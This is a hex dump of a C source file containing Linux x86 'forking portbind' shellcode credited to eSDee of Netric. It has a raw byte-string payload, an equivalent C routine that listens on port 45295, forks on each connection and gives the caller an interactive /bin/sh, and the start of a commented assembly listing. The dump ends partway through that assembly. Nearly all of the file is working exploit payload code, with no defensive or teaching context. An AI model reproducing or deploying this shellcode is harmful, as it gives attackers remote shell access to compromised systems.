00000000  2f 2a 20 6c 69 6e 75 78  20 78 38 36 20 73 68 65  |/* linux x86 she|
00000010  6c 6c 63 6f 64 65 20 62  79 20 65 53 44 65 65 20  |llcode by eSDee |
00000020  6f 66 20 4e 65 74 72 69  63 20 28 77 77 77 2e 6e  |of Netric (www.n|
00000030  65 74 72 69 63 2e 6f 72  67 29 0d 0a 20 2a 20 32  |etric.org).. * 2|
00000040  30 30 20 62 79 74 65 20  2d 20 66 6f 72 6b 69 6e  |00 byte - forkin|
00000050  67 20 70 6f 72 74 62 69  6e 64 20 73 68 65 6c 6c  |g portbind shell|
00000060  63 6f 64 65 20 2d 20 70  6f 72 74 3d 30 78 62 30  |code - port=0xb0|
00000070  65 66 28 34 35 32 39 35  29 0d 0a 20 2a 2f 20 20  |ef(45295).. */  |
00000080  20 20 20 0d 0a 0d 0a 23  69 6e 63 6c 75 64 65 20  |   ....#include |
00000090  3c 73 74 64 69 6f 2e 68  3e 0d 0a 0d 0a 63 68 61  |<stdio.h>....cha|
000000a0  72 0d 0a 6d 61 69 6e 5b  5d 20 3d 0d 0a 20 20 20  |r..main[] =..   |
000000b0  20 20 20 20 20 22 5c 78  33 31 5c 78 63 30 5c 78  |     "\x31\xc0\x|
000000c0  33 31 5c 78 64 62 5c 78  33 31 5c 78 63 39 5c 78  |31\xdb\x31\xc9\x|
000000d0  35 31 5c 78 62 31 22 0d  0a 20 20 20 20 20 20 20  |51\xb1"..       |
000000e0  20 22 5c 78 30 36 5c 78  35 31 5c 78 62 31 5c 78  | "\x06\x51\xb1\x|
000000f0  30 31 5c 78 35 31 5c 78  62 31 5c 78 30 32 5c 78  |01\x51\xb1\x02\x|
00000100  35 31 22 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |51"..        "\x|
00000110  38 39 5c 78 65 31 5c 78  62 33 5c 78 30 31 5c 78  |89\xe1\xb3\x01\x|
00000120  62 30 5c 78 36 36 5c 78  63 64 5c 78 38 30 22 0d  |b0\x66\xcd\x80".|
00000130  0a 20 20 20 20 20 20 20  20 22 5c 78 38 39 5c 78  |.        "\x89\x|
00000140  63 31 5c 78 33 31 5c 78  63 30 5c 78 33 31 5c 78  |c1\x31\xc0\x31\x|
00000150  64 62 5c 78 35 30 5c 78  35 30 22 0d 0a 20 20 20  |db\x50\x50"..   |
00000160  20 20 20 20 20 22 5c 78  35 30 5c 78 36 36 5c 78  |     "\x50\x66\x|
00000170  36 38 5c 78 62 30 5c 78  65 66 5c 78 62 33 5c 78  |68\xb0\xef\xb3\x|
00000180  30 32 5c 78 36 36 22 0d  0a 20 20 20 20 20 20 20  |02\x66"..       |
00000190  20 22 5c 78 35 33 5c 78  38 39 5c 78 65 32 5c 78  | "\x53\x89\xe2\x|
000001a0  62 33 5c 78 31 30 5c 78  35 33 5c 78 62 33 5c 78  |b3\x10\x53\xb3\x|
000001b0  30 32 22 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |02"..        "\x|
000001c0  35 32 5c 78 35 31 5c 78  38 39 5c 78 63 61 5c 78  |52\x51\x89\xca\x|
000001d0  38 39 5c 78 65 31 5c 78  62 30 5c 78 36 36 22 0d  |89\xe1\xb0\x66".|
000001e0  0a 20 20 20 20 20 20 20  20 22 5c 78 63 64 5c 78  |.        "\xcd\x|
000001f0  38 30 5c 78 33 31 5c 78  64 62 5c 78 33 39 5c 78  |80\x31\xdb\x39\x|
00000200  63 33 5c 78 37 34 5c 78  30 35 22 0d 0a 20 20 20  |c3\x74\x05"..   |
00000210  20 20 20 20 20 22 5c 78  33 31 5c 78 63 30 5c 78  |     "\x31\xc0\x|
00000220  34 30 5c 78 63 64 5c 78  38 30 5c 78 33 31 5c 78  |40\xcd\x80\x31\x|
00000230  63 30 5c 78 35 30 22 0d  0a 20 20 20 20 20 20 20  |c0\x50"..       |
00000240  20 22 5c 78 35 32 5c 78  38 39 5c 78 65 31 5c 78  | "\x52\x89\xe1\x|
00000250  62 33 5c 78 30 34 5c 78  62 30 5c 78 36 36 5c 78  |b3\x04\xb0\x66\x|
00000260  63 64 22 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |cd"..        "\x|
00000270  38 30 5c 78 38 39 5c 78  64 37 5c 78 33 31 5c 78  |80\x89\xd7\x31\x|
00000280  63 30 5c 78 33 31 5c 78  64 62 5c 78 33 31 22 0d  |c0\x31\xdb\x31".|
00000290  0a 20 20 20 20 20 20 20  20 22 5c 78 63 39 5c 78  |.        "\xc9\x|
000002a0  62 33 5c 78 31 31 5c 78  62 31 5c 78 30 31 5c 78  |b3\x11\xb1\x01\x|
000002b0  62 30 5c 78 33 30 5c 78  63 64 22 0d 0a 20 20 20  |b0\x30\xcd"..   |
000002c0  20 20 20 20 20 22 5c 78  38 30 5c 78 33 31 5c 78  |     "\x80\x31\x|
000002d0  63 30 5c 78 33 31 5c 78  64 62 5c 78 35 30 5c 78  |c0\x31\xdb\x50\x|
000002e0  35 30 5c 78 35 37 22 0d  0a 20 20 20 20 20 20 20  |50\x57"..       |
000002f0  20 22 5c 78 38 39 5c 78  65 31 5c 78 62 33 5c 78  | "\x89\xe1\xb3\x|
00000300  30 35 5c 78 62 30 5c 78  36 36 5c 78 63 64 5c 78  |05\xb0\x66\xcd\x|
00000310  38 30 22 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |80"..        "\x|
00000320  38 39 5c 78 63 36 5c 78  33 31 5c 78 63 30 5c 78  |89\xc6\x31\xc0\x|
00000330  33 31 5c 78 64 62 5c 78  62 30 5c 78 30 32 22 0d  |31\xdb\xb0\x02".|
00000340  0a 20 20 20 20 20 20 20  20 22 5c 78 63 64 5c 78  |.        "\xcd\x|
00000350  38 30 5c 78 33 39 5c 78  63 33 5c 78 37 35 5c 78  |80\x39\xc3\x75\x|
00000360  34 30 5c 78 33 31 5c 78  63 30 22 0d 0a 20 20 20  |40\x31\xc0"..   |
00000370  20 20 20 20 20 22 5c 78  38 39 5c 78 66 62 5c 78  |     "\x89\xfb\x|
00000380  62 30 5c 78 30 36 5c 78  63 64 5c 78 38 30 5c 78  |b0\x06\xcd\x80\x|
00000390  33 31 5c 78 63 30 22 0d  0a 20 20 20 20 20 20 20  |31\xc0"..       |
000003a0  20 22 5c 78 33 31 5c 78  63 39 5c 78 38 39 5c 78  | "\x31\xc9\x89\x|
000003b0  66 33 5c 78 62 30 5c 78  33 66 5c 78 63 64 5c 78  |f3\xb0\x3f\xcd\x|
000003c0  38 30 22 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |80"..        "\x|
000003d0  33 31 5c 78 63 30 5c 78  34 31 5c 78 62 30 5c 78  |31\xc0\x41\xb0\x|
000003e0  33 66 5c 78 63 64 5c 78  38 30 5c 78 33 31 22 0d  |3f\xcd\x80\x31".|
000003f0  0a 20 20 20 20 20 20 20  20 22 5c 78 63 30 5c 78  |.        "\xc0\x|
00000400  34 31 5c 78 62 30 5c 78  33 66 5c 78 63 64 5c 78  |41\xb0\x3f\xcd\x|
00000410  38 30 5c 78 33 31 5c 78  63 30 22 0d 0a 20 20 20  |80\x31\xc0"..   |
00000420  20 20 20 20 20 22 5c 78  35 30 5c 78 36 38 5c 78  |     "\x50\x68\x|
00000430  32 66 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |2f\x2f\x73\x68\x|
00000440  36 38 5c 78 32 66 22 0d  0a 20 20 20 20 20 20 20  |68\x2f"..       |
00000450  20 22 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  | "\x62\x69\x6e\x|
00000460  38 39 5c 78 65 33 5c 78  38 62 5c 78 35 34 5c 78  |89\xe3\x8b\x54\x|
00000470  32 34 22 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |24"..        "\x|
00000480  30 38 5c 78 35 30 5c 78  35 33 5c 78 38 39 5c 78  |08\x50\x53\x89\x|
00000490  65 31 5c 78 62 30 5c 78  30 62 5c 78 63 64 22 0d  |e1\xb0\x0b\xcd".|
000004a0  0a 20 20 20 20 20 20 20  20 22 5c 78 38 30 5c 78  |.        "\x80\x|
000004b0  33 31 5c 78 63 30 5c 78  34 30 5c 78 63 64 5c 78  |31\xc0\x40\xcd\x|
000004c0  38 30 5c 78 33 31 5c 78  63 30 22 0d 0a 20 20 20  |80\x31\xc0"..   |
000004d0  20 20 20 20 20 22 5c 78  38 39 5c 78 66 33 5c 78  |     "\x89\xf3\x|
000004e0  62 30 5c 78 30 36 5c 78  63 64 5c 78 38 30 5c 78  |b0\x06\xcd\x80\x|
000004f0  65 62 5c 78 39 39 22 3b  0d 0a 0d 0a 0d 0a 69 6e  |eb\x99";......in|
00000500  74 0d 0a 63 5f 63 6f 64  65 28 29 0d 0a 7b 0d 0a  |t..c_code()..{..|
00000510  20 20 20 20 20 20 20 20  63 68 61 72 20 2a 61 72  |        char *ar|
00000520  67 76 5b 32 5d 3b 0d 0a  20 20 20 20 20 20 20 20  |gv[2];..        |
00000530  63 68 61 72 20 2a 73 6f  63 6b 61 64 64 72 20 3d  |char *sockaddr =|
00000540  20 20 22 5c 78 30 32 5c  78 30 30 22 20 20 20 20  |  "\x02\x00"    |
00000550  20 20 20 20 20 20 20 20  20 2f 2f 20 20 41 64 64  |         //  Add|
00000560  72 65 73 73 20 66 61 6d  69 6c 79 0d 0a 20 20 20  |ress family..   |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000580  20 20 20 20 20 20 20 22  5c 78 62 30 5c 78 65 66  |       "\xb0\xef|
00000590  22 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |"             //|
000005a0  20 20 70 6f 72 74 0d 0a  20 20 20 20 20 20 20 20  |  port..        |
000005b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005c0  20 20 22 5c 78 30 30 5c  78 30 30 5c 78 30 30 5c  |  "\x00\x00\x00\|
000005d0  78 30 30 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |x00"..          |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005f0  22 5c 78 30 30 5c 78 30  30 5c 78 30 30 5c 78 30  |"\x00\x00\x00\x0|
00000600  30 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |0"..            |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000620  78 30 30 5c 78 30 30 5c  78 30 30 5c 78 30 30 22  |x00\x00\x00\x00"|
00000630  3b 0d 0a 0d 0a 20 20 20  20 20 20 20 20 69 6e 74  |;....        int|
00000640  20 73 6f 63 6b 20 20 20  20 20 20 20 20 3d 20 30  | sock        = 0|
00000650  3b 0d 0a 20 20 20 20 20  20 20 20 69 6e 74 20 6e  |;..        int n|
00000660  65 77 5f 73 6f 63 6b 20  20 20 20 3d 20 30 3b 0d  |ew_sock    = 0;.|
00000670  0a 20 20 20 20 20 20 20  20 69 6e 74 20 61 20 20  |.        int a  |
00000680  20 20 20 20 20 20 20 20  20 3d 20 31 36 3b 0d 0a  |         = 16;..|
00000690  0d 0a 20 20 20 20 20 20  20 20 73 6f 63 6b 20 3d  |..        sock =|
000006a0  20 73 6f 63 6b 65 74 28  32 2c 20 31 2c 20 36 29  | socket(2, 1, 6)|
000006b0  3b 0d 0a 20 20 20 20 20  20 20 20 69 66 20 28 62  |;..        if (b|
000006c0  69 6e 64 28 73 6f 63 6b  2c 20 73 6f 63 6b 61 64  |ind(sock, sockad|
000006d0  64 72 2c 20 31 36 29 20  21 3d 20 30 29 20 65 78  |dr, 16) != 0) ex|
000006e0  69 74 28 29 3b 0d 0a 20  20 20 20 20 20 20 20 6c  |it();..        l|
000006f0  69 73 74 65 6e 28 73 6f  63 6b 2c 20 30 29 3b 0d  |isten(sock, 0);.|
00000700  0a 0d 0a 20 20 20 20 20  20 20 20 73 69 67 6e 61  |...        signa|
00000710  6c 28 31 37 2c 20 31 29  3b 0d 0a 0d 0a 20 20 20  |l(17, 1);....   |
00000720  20 20 20 20 20 77 68 69  6c 65 28 31 29 20 7b 0d  |     while(1) {.|
00000730  0a 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |...             |
00000740  20 20 20 6e 65 77 5f 73  6f 63 6b 20 3d 20 61 63  |   new_sock = ac|
00000750  63 65 70 74 28 73 6f 63  6b 2c 20 30 2c 20 30 29  |cept(sock, 0, 0)|
00000760  3b 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |;....           |
00000770  20 20 20 20 20 69 66 20  28 66 6f 72 6b 28 29 20  |     if (fork() |
00000780  3d 3d 20 30 29 20 7b 0d  0a 20 20 20 20 20 20 20  |== 0) {..       |
00000790  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007a0  20 63 6c 6f 73 65 28 73  6f 63 6b 29 3b 0d 0a 20  | close(sock);.. |
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007c0  20 20 20 20 20 20 20 64  75 70 32 28 6e 65 77 5f  |       dup2(new_|
000007d0  73 6f 63 6b 2c 20 30 29  3b 0d 0a 20 20 20 20 20  |sock, 0);..     |
000007e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007f0  20 20 20 64 75 70 32 28  6e 65 77 5f 73 6f 63 6b  |   dup2(new_sock|
00000800  2c 20 31 29 3b 0d 0a 20  20 20 20 20 20 20 20 20  |, 1);..         |
00000810  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 64  |               d|
00000820  75 70 32 28 6e 65 77 5f  73 6f 63 6b 2c 20 32 29  |up2(new_sock, 2)|
00000830  3b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |;..             |
00000840  20 20 20 20 20 20 20 20  20 20 20 61 72 67 76 5b  |           argv[|
00000850  30 5d 20 3d 20 22 2f 2f  62 69 6e 2f 73 68 22 3b  |0] = "//bin/sh";|
00000860  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000870  20 20 20 20 20 20 20 20  20 20 61 72 67 76 5b 31  |          argv[1|
00000880  5d 20 3d 20 4e 55 4c 4c  3b 0d 0a 20 20 20 20 20  |] = NULL;..     |
00000890  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008a0  20 20 20 65 78 65 63 76  65 28 61 72 67 76 5b 30  |   execve(argv[0|
000008b0  5d 2c 20 26 61 72 67 76  5b 30 5d 2c 20 4e 55 4c  |], &argv[0], NUL|
000008c0  4c 29 3b 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |L);..           |
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 20 65 78 69  |             exi|
000008e0  74 28 29 3b 0d 0a 20 20  20 20 20 20 20 20 20 20  |t();..          |
000008f0  20 20 20 20 20 20 7d 0d  0a 0d 0a 20 20 20 20 20  |      }....     |
00000900  20 20 20 20 20 20 20 20  20 20 20 63 6c 6f 73 65  |           close|
00000910  28 6e 65 77 5f 73 6f 63  6b 29 3b 0d 0a 20 20 20  |(new_sock);..   |
00000920  20 20 20 20 20 7d 0d 0a  0d 0a 7d 0d 0a 0d 0a 0d  |     }....}.....|
00000930  0a 69 6e 74 0d 0a 61 73  6d 5f 63 6f 64 65 28 29  |.int..asm_code()|
00000940  0d 0a 7b 0d 0a 20 20 20  20 20 20 20 20 5f 5f 61  |..{..        __a|
00000950  73 6d 28 22 20 23 20 73  6f 63 6b 20 3d 20 73 6f  |sm(" # sock = so|
00000960  63 6b 65 74 28 32 2c 20  31 2c 20 36 29 3b 0d 0a  |cket(2, 1, 6);..|
00000970  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000980  78 6f 72 6c 20 20 20 20  25 65 61 78 2c 20 20 20  |xorl    %eax,   |
00000990  25 65 61 78 0d 0a 20 20  20 20 20 20 20 20 20 20  |%eax..          |
000009a0  20 20 20 20 20 20 78 6f  72 6c 20 20 20 20 25 65  |      xorl    %e|
000009b0  62 78 2c 20 20 20 25 65  62 78 0d 0a 20 20 20 20  |bx,   %ebx..    |
000009c0  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 6c  |            xorl|
000009d0  20 20 20 20 25 65 63 78  2c 20 20 20 25 65 63 78  |    %ecx,   %ecx|
000009e0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000009f0  20 20 70 75 73 68 6c 20  20 20 25 65 63 78 0d 0a  |  pushl   %ecx..|
00000a00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a10  6d 6f 76 62 20 20 20 20  24 36 2c 20 20 20 20 20  |movb    $6,     |
00000a20  25 63 6c 20 20 20 20 20  20 20 20 20 20 20 20 20  |%cl             |
00000a30  23 20 49 50 50 52 4f 54  4f 5f 54 43 50 0d 0a 20  |# IPPROTO_TCP.. |
00000a40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000a50  75 73 68 6c 20 20 20 25  65 63 78 0d 0a 20 20 20  |ushl   %ecx..   |
00000a60  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000a70  62 20 20 20 20 24 31 2c  20 20 20 20 20 25 63 6c  |b    $1,     %cl|
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 53  |             # S|
00000a90  4f 43 4b 5f 53 54 52 45  41 4d 0d 0a 20 20 20 20  |OCK_STREAM..    |
00000aa0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000ab0  6c 20 20 20 25 65 63 78  0d 0a 20 20 20 20 20 20  |l   %ecx..      |
00000ac0  20 20 20 20 20 20 20 20  20 20 6d 6f 76 62 20 20  |          movb  |
00000ad0  20 20 24 32 2c 20 20 20  20 20 25 63 6c 20 20 20  |  $2,     %cl   |
00000ae0  20 20 20 20 20 20 20 20  20 20 23 20 41 46 5f 49  |          # AF_I|
00000af0  4e 45 54 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |NET..           |
00000b00  20 20 20 20 20 70 75 73  68 6c 20 20 20 25 65 63  |     pushl   %ec|
00000b10  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00000b20  20 20 20 6d 6f 76 6c 20  20 20 20 25 65 73 70 2c  |   movl    %esp,|
00000b30  20 20 20 25 65 63 78 0d  0a 20 20 20 20 20 20 20  |   %ecx..       |
00000b40  20 20 20 20 20 20 20 20  20 6d 6f 76 62 20 20 20  |         movb   |
00000b50  20 24 31 2c 20 20 20 20  20 25 62 6c 20 20 20 20  | $1,     %bl    |
00000b60  20 20 20 20 20 20 20 20  20 23 20 53 59 53 5f 53  |         # SYS_S|
00000b70  4f 43 4b 45 54 0d 0a 20  20 20 20 20 20 20 20 20  |OCKET..         |
00000b80  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00000b90  31 30 32 2c 20 20 20 25  61 6c 20 20 20 20 20 20  |102,   %al      |
00000ba0  20 20 20 20 20 20 20 23  20 53 59 53 5f 73 6f 63  |       # SYS_soc|
00000bb0  6b 65 74 63 61 6c 6c 0d  0a 20 20 20 20 20 20 20  |ketcall..       |
00000bc0  20 20 20 20 20 20 20 20  20 69 6e 74 20 20 20 20  |         int    |
00000bd0  20 24 30 78 38 30 20 20  20 20 20 20 20 20 20 20  | $0x80          |
00000be0  20 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  | ..             |
00000bf0  20 20 20 6d 6f 76 6c 20  20 20 20 25 65 61 78 2c  |   movl    %eax,|
00000c00  20 20 20 25 65 63 78 0d  0a 0d 0a 20 20 20 20 20  |   %ecx....     |
00000c10  20 20 20 20 20 20 20 20  20 20 20 23 20 69 66 20  |           # if |
00000c20  28 62 69 6e 64 28 73 6f  63 6b 2c 20 73 6f 63 6b  |(bind(sock, sock|
00000c30  61 64 64 72 2c 20 31 36  29 20 21 3d 20 30 29 20  |addr, 16) != 0) |
00000c40  65 78 69 74 28 29 3b 0d  0a 20 20 20 20 20 20 20  |exit();..       |
00000c50  20 20 20 20 20 20 20 20  20 78 6f 72 6c 20 20 20  |         xorl   |
00000c60  20 25 65 61 78 2c 20 20  20 25 65 61 78 0d 0a 20  | %eax,   %eax.. |
00000c70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00000c80  6f 72 6c 20 20 20 20 25  65 62 78 2c 20 20 20 25  |orl    %ebx,   %|
00000c90  65 62 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |ebx..           |
00000ca0  20 20 20 20 20 70 75 73  68 6c 20 20 20 25 65 61  |     pushl   %ea|
00000cb0  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00000cc0  20 20 20 70 75 73 68 6c  20 20 20 25 65 61 78 0d  |   pushl   %eax.|
00000cd0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000ce0  20 70 75 73 68 6c 20 20  20 25 65 61 78 0d 0a 20  | pushl   %eax.. |
00000cf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000d00  75 73 68 77 20 20 20 24  30 78 65 66 62 30 20 20  |ushw   $0xefb0  |
00000d10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |               #|
00000d20  20 70 6f 72 74 0d 0a 20  20 20 20 20 20 20 20 20  | port..         |
00000d30  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00000d40  30 78 30 32 2c 20 20 25  62 6c 20 20 20 20 20 20  |0x02,  %bl      |
00000d50  20 20 20 20 20 20 20 23  20 61 64 64 72 65 73 73  |       # address|
00000d60  20 66 61 6d 69 6c 79 0d  0a 20 20 20 20 20 20 20  | family..       |
00000d70  20 20 20 20 20 20 20 20  20 70 75 73 68 77 20 20  |         pushw  |
00000d80  20 25 62 78 0d 0a 20 20  20 20 20 20 20 20 20 20  | %bx..          |
00000d90  20 20 20 20 20 20 6d 6f  76 6c 20 20 20 20 25 65  |      movl    %e|
00000da0  73 70 2c 20 20 20 25 65  64 78 0d 0a 20 20 20 20  |sp,   %edx..    |
00000db0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 62  |            movb|
00000dc0  20 20 20 20 24 31 36 2c  20 20 20 20 25 62 6c 0d  |    $16,    %bl.|
00000dd0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000de0  20 70 75 73 68 6c 20 20  20 25 65 62 78 20 20 20  | pushl   %ebx   |
00000df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e00  20 23 20 31 36 0d 0a 20  20 20 20 20 20 20 20 20  | # 16..         |
00000e10  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00000e20  32 2c 20 20 20 20 20 25  62 6c 20 20 20 20 20 20  |2,     %bl      |
00000e30  20 20 20 20 20 20 20 23  20 53 59 53 5f 42 49 4e  |       # SYS_BIN|
00000e40  44 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |D..             |
00000e50  20 20 20 70 75 73 68 6c  20 20 20 25 65 64 78 0d  |   pushl   %edx.|
00000e60  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000e70  20 70 75 73 68 6c 20 20  20 25 65 63 78 20 20 20  | pushl   %ecx   |
00000e80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e90  20 23 20 73 6f 63 6b 0d  0a 20 20 20 20 20 20 20  | # sock..       |
00000ea0  20 20 20 20 20 20 20 20  20 6d 6f 76 6c 20 20 20  |         movl   |
00000eb0  20 25 65 63 78 2c 20 20  20 25 65 64 78 0d 0a 20  | %ecx,   %edx.. |
00000ec0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000ed0  6f 76 6c 20 20 20 20 25  65 73 70 2c 20 20 20 25  |ovl    %esp,   %|
00000ee0  65 63 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |ecx..           |
00000ef0  20 20 20 20 20 6d 6f 76  62 20 20 20 20 24 31 30  |     movb    $10|
00000f00  32 2c 20 20 20 25 61 6c  20 20 20 20 20 20 20 20  |2,   %al        |
00000f10  20 20 20 20 20 23 20 53  59 53 5f 73 6f 63 6b 65  |     # SYS_socke|
00000f20  74 63 61 6c 6c 0d 0a 20  20 20 20 20 20 20 20 20  |tcall..         |
00000f30  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 20 24  |       int     $|
00000f40  30 78 38 30 0d 0a 20 20  20 20 20 20 20 20 20 20  |0x80..          |
00000f50  20 20 20 20 20 20 78 6f  72 6c 20 20 20 20 25 65  |      xorl    %e|
00000f60  62 78 2c 20 20 20 25 65  62 78 0d 0a 20 20 20 20  |bx,   %ebx..    |
00000f70  20 20 20 20 20 20 20 20  20 20 20 20 63 6d 70 6c  |            cmpl|
00000f80  20 20 20 20 25 65 61 78  2c 20 20 20 25 65 62 78  |    %eax,   %ebx|
00000f90  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000fa0  20 20 6a 65 20 20 20 20  20 20 53 4b 49 50 5f 45  |  je      SKIP_E|
00000fb0  58 49 54 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |XIT..           |
00000fc0  20 20 20 20 20 78 6f 72  6c 20 20 20 20 25 65 61  |     xorl    %ea|
00000fd0  78 2c 20 20 20 25 65 61  78 0d 0a 20 20 20 20 20  |x,   %eax..     |
00000fe0  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 6c 20  |           incl |
00000ff0  20 20 20 25 65 61 78 20  20 20 20 20 20 20 20 20  |   %eax         |
00001000  20 20 20 20 20 20 20 20  20 20 20 23 20 53 59 53  |           # SYS|
00001010  5f 65 78 69 74 0d 0a 20  20 20 20 20 20 20 20 20  |_exit..         |
00001020  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 20 24  |       int     $|
00001030  30 78 38 30 20 0d 0a 20  20 20 20 20 20 20 20 20  |0x80 ..         |
00001040  20 20 20 20 20 20 20 53  4b 49 50 5f 45 58 49 54  |       SKIP_EXIT|
00001050  3a 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |:....           |
00001060  20 20 20 20 20 23 20 6c  69 73 74 65 6e 28 73 6f  |     # listen(so|
00001070  63 6b 2c 20 30 29 3b 20  20 20 20 20 20 20 20 20  |ck, 0);         |
00001080  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00001090  20 20 20 20 20 20 20 78  6f 72 6c 20 20 20 20 25  |       xorl    %|
000010a0  65 61 78 2c 20 20 20 25  65 61 78 0d 0a 20 20 20  |eax,   %eax..   |
000010b0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
000010c0  68 6c 20 20 20 25 65 61  78 0d 0a 20 20 20 20 20  |hl   %eax..     |
000010d0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 6c  |           pushl|
000010e0  20 20 20 25 65 64 78 20  20 20 20 20 20 20 20 20  |   %edx         |
000010f0  20 20 20 20 20 20 20 20  20 20 20 23 20 73 6f 63  |           # soc|
00001100  6b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |k..             |
00001110  20 20 20 6d 6f 76 6c 20  20 20 20 25 65 73 70 2c  |   movl    %esp,|
00001120  20 20 20 25 65 63 78 0d  0a 20 20 20 20 20 20 20  |   %ecx..       |
00001130  20 20 20 20 20 20 20 20  20 6d 6f 76 62 20 20 20  |         movb   |
00001140  20 24 34 2c 20 20 20 20  20 25 62 6c 20 20 20 20  | $4,     %bl    |
00001150  20 20 20 20 20 20 20 20  20 23 20 53 59 53 5f 4c  |         # SYS_L|
00001160  49 53 54 45 4e 0d 0a 20  20 20 20 20 20 20 20 20  |ISTEN..         |
00001170  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00001180  31 30 32 2c 20 20 20 25  61 6c 20 20 20 20 20 20  |102,   %al      |
00001190  20 20 20 20 20 20 20 23  20 53 59 53 5f 73 6f 63  |       # SYS_soc|
000011a0  6b 65 74 63 61 6c 6c 0d  0a 20 20 20 20 20 20 20  |ketcall..       |
000011b0  20 20 20 20 20 20 20 20  20 69 6e 74 20 20 20 20  |         int    |
000011c0  20 24 30 78 38 30 0d 0a  20 20 20 20 20 20 20 20  | $0x80..        |
000011d0  20 20 20 20 20 20 20 20  6d 6f 76 6c 20 20 20 20  |        movl    |
000011e0  25 65 64 78 2c 20 20 20  25 65 64 69 0d 0a 0d 0a  |%edx,   %edi....|
000011f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001200  78 6f 72 6c 20 20 20 20  25 65 61 78 2c 20 20 20  |xorl    %eax,   |
00001210  25 65 61 78 0d 0a 20 20  20 20 20 20 20 20 20 20  |%eax..          |
00001220  20 20 20 20 20 20 78 6f  72 6c 20 20 20 20 25 65  |      xorl    %e|
00001230  62 78 2c 20 20 20 25 65  62 78 0d 0a 20 20 20 20  |bx,   %ebx..    |
00001240  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 6c  |            xorl|
00001250  20 20 20 20 25 65 63 78  2c 20 20 20 25 65 63 78  |    %ecx,   %ecx|
00001260  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001270  20 20 6d 6f 76 62 20 20  20 20 24 31 37 2c 20 20  |  movb    $17,  |
00001280  20 20 25 62 6c 20 20 20  20 20 20 20 20 20 20 20  |  %bl           |
00001290  20 20 23 20 53 49 47 43  48 4c 44 0d 0a 20 20 20  |  # SIGCHLD..   |
000012a0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000012b0  62 20 20 20 20 24 31 2c  20 20 20 20 20 25 63 6c  |b    $1,     %cl|
